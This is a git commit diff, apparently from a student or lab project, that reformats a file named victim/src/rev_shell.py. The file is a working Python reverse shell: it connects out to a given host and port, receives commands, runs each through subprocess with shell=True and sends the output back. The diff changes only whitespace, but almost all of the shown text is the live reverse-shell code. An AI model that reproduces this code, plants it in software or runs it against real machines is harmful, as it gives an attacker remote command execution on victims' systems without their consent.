c2a4788480f24fd02ac4e05d18334be113f01ed3
Dea <d.llazo@student.tue.nl>
2022-05-15 18:10:23 +0200

    back to normal

--- victim/src/rev_shell.py
+++ victim/src/rev_shell.py
@@ -2,13 +2,13 @@ import os
 import socket
 import subprocess
 
-def get_shell(HOST: str, PORT: int):
 
-    # Selects family IPv4 to connect with TCP 
+def get_shell(HOST: str, PORT: int):
+    # Selects family IPv4 to connect with TCP
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     # Connect to host (add timeout?)
     s.connect((HOST, PORT))
-    
+
     s.send(str.encode("Succesfully connected\n"))
 
     while 1:
@@ -16,17 +16,17 @@ def get_shell(HOST: str, PORT: int):
             s.send(str.encode(os.getcwd() + "> "))
             data = s.recv(1024).decode("UTF-8")
             data = data.strip('\n')
-            if data == "quit": 
+            if data == "quit":
                 break
             if data[:2] == "cd":
                 os.chdir(data[3:])
             if len(data) > 0:
-                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                        stdin=subprocess.PIPE)
                 stdout_value = proc.stdout.read() + proc.stderr.read()
                 output_str = str(stdout_value, "UTF-8")
                 s.send(str.encode("\n" + output_str))
         except Exception as e:
             continue
-        
+
     s.close()
-    
